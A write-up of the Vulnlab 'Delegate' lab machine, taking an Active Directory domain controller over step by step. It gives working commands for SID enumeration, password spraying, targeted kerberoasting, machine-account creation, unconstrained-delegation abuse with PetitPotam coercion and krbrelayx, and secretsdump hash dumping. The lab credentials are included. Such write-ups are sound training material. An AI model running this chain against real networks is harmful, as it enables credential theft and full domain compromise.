
# Vulnlab - Delegate

```bash
Host is up (0.22s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
53/tcp    open  domain     Simple DNS Plus
88/tcp open  kerberos-sec
135/tcp   open  msrpc      Microsoft Windows RPC
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
464/tcp   open  tcpwrapped
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Issuer: commonName=DC1.delegate.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-30T15:47:02
| Not valid after:  2024-03-31T15:47:02
| MD5:   3a340b861cd985281f509d995bef9f4a
|_SHA-1: ccc740dd30a643bfc26e0b7f5d018da28d7e1630
5985/tcp  open
9389/tcp  open  tcpwrapped
47001/tcp open  tcpwrapped
49667/tcp open  tcpwrapped
49669/tcp open  tcpwrapped
49670/tcp open  tcpwrapped
49686/tcp open  tcpwrapped
49691/tcp open  tcpwrapped
```

Enumerating smb with anonymous user doesn't show any intereting shares

<img src="https://i.imgur.com/5T7m6Wc.png"/>

We can however enumerate domain users with `lookupsid` using a guest account by brute forcing SIDs

```bash
lookupsid.py guest@delegate.vl 10000
```

<img src="https://i.imgur.com/mHQjqig.png"/>

Having the domain users, we can check if there's any account having pre-authentication disabled which can lead to AS-REP roasting

<img src="https://i.imgur.com/Mzd6QNB.png"/>

Checking the shares and accessing `SYSVOL` share, we can find `users.bat` file having a password

<img src="https://i.imgur.com/pPS9oqv.png"/>

<img src="https://i.imgur.com/4zLhJ9x.png"/>

Spraying this password on the users we have confirms that this password belongs `A.Briggs`

<img src="https://i.imgur.com/KKMg418.png"/>

Running `python-bloodhound` to enumerate the domain

```bash
python3 bloodhound.py -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123' -c all -ns 10.10.70.255
```

<img src="https://i.imgur.com/NS2Alck.png"/>
From bloodhound we can see `A.Briggs` has `GenericWrite` on `N.thompson` 

<img src="https://i.imgur.com/XXBdCnV.png"/>

This can abuse either through `Shadow credentials` or associating a SPN to N.Thompson for `Targeted kerberoasting`, I tried with shadow credentials by editing `msDS-KeyCredentialLink` but due to PKINT notbeing supported by this DC it didn't worked

<img src="https://i.imgur.com/KSFCoRD.png"/>
Attempting to perfrom targeted kerberoasting

```bash
python3 /opt/targetedKerberoast/targetedKerberoast.py -u 'A.Briggs' -p 'P4ssw0rd1#123' --request-user N.Thompson -d 'delegate.vl'
```

<img src="https://i.imgur.com/SSgPgM6.png"/>
Cracking the hash with hashcat

<img src="https://i.imgur.com/ahcovF4.png"/>

<img src="https://i.imgur.com/6P3OeDC.png"/>

Since n.thompson has `CanPSRemote` we can login through WinRM

<img src="https://i.imgur.com/qPBmeqO.png"/>

This user belongs to `Delegation Admins` but there wasn't ACLs on bloodhound for that group

<img src="https://i.imgur.com/W5iHR9b.png"/>

Checking privileges of this user shows that it has `SeEnableDelegationPrivilege` enabled

<img src="https://i.imgur.com/jGLcF3n.png"/>

This means that we can abuse unconstrained delegation by creating machine account and append a SPN to it, before that we need to make sure if machine quota isn't 0

<img src="https://i.imgur.com/9DIU52f.png"/>
First creating a machine account with `addcomputer.py`

```bash
addcomputer.py -dc-ip 10.10.70.255 -computer-pass TestPassword321 -computer-name UwU delegate.vl/N.Thompson:'KALEB_2341'
```

<img src="https://i.imgur.com/ie6I3ut.png"/>

Adding dns record for the machine account we created

```bash
python3 dnstool.py -u 'delegate.vl\UwU$' -p TestPassword321 -r UwU.delegate.vl -d 10.8.0.136 --action add DC1.delegate.vl -dns-ip 10.10.70.255
```

<img src="https://i.imgur.com/yfFJsSv.png"/>

Adding a DNS entry for this machine account with `dnstool`

```
python3 dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r UwU.delegate.vl -d 10.8.0.136 --action add DC1.delegate.vl -dns-ip 10.10.85.247
```

<img src="https://i.imgur.com/DUcQeCL.png"/>

To abuse unconstrained delegation the machine needs to have a SPN and `TRUSTED_FOR_DELEGATION` UAC, using `bloodyAD` we can add the UAC

```bash
python3 /opt/bloodyAD/bloodyAD.py -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host 'DC1.delegate.vl' add uac 'UwU$' -f TRUSTED_FOR_DELEGATION
```

<img src="https://i.imgur.com/v72iUUK.png"/>

Appending SPN with `addspn` via `msDS-AdditionalDnsHostName`

```bash
python3 ./addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.10.85.247 DC1.delegate.vl --additional

python3 ./addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.10.85.247 DC1.delegate.vl
```

<img src="https://i.imgur.com/iZqTTyP.png"/>
<img src="https://i.imgur.com/t0ijxmx.png"/>
Now running `krbrelayx` by first coercing authentication (using any poc i.e petipotam, printerbug, dfscoerce ) from DC1 to our added machine with unconstrained delegation enabled, this will grab the copy of DC1's TGT which gets stored in the memory of machine account having trusted for delegation enabled for the purpose of accessing resources

```bash
python3 PetitPotam.py -u 'UwU$' -p 'TestPassword321' UwU.delegate.vl 10.10.85.247
```

<img src="https://i.imgur.com/9V6o5Pl.png"/>
And running krbrelayx with NThash of the machine account

```bash
python3 ./krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC
```

<img src="https://i.imgur.com/I4Tnoir.png"/>

Having the ticket, we can export it and dump the hashes with `secretsdump`

<img src="https://i.imgur.com/DdNzx2r.png"/>

```bash
secretsdump.py 'DC1$'@DC1.delegate.vl -k -no-pass
```

<img src="https://i.imgur.com/JURp4Ve.png"/>

<img src="https://i.imgur.com/YEkn5Ta.png"/>

# References

- https://www.thehacker.recipes/a-d/movement/dacl/targeted-kerberoasting
- https://exploit.ph/user-constrained-delegation.html
- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
- https://github.com/CravateRouge/bloodyAD
- https://medium.com/r3d-buck3t/attacking-kerberos-unconstrained-delegation-ef77e1fb7203
